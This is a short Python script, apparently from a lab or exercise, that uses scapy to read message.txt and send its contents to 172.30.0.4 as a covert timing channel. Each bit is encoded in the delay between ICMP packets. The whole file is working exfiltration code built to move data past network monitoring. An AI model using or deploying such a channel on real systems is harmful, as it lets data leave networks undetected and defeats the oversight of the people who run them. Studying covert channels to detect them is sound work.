#!/usr/bin/env python3
import time
from scapy.all import *

def text_to_bits(text):
    return ''.join(format(ord(c), '08b') for c in text)

def send_timed_packets(dest_ip, bits):
    for bit in bits:
        send(IP(dst=dest_ip)/ICMP(), verbose=0)
        time.sleep(0.1 if bit == '0' else 0.5)

if __name__ == "__main__":
    with open("message.txt", "r") as f:
        message = f.read().strip()
    bits = text_to_bits(message)
    send_timed_packets("172.30.0.4", bits)
    print(f"[+] Sent {len(bits)} packets using timing channel.")

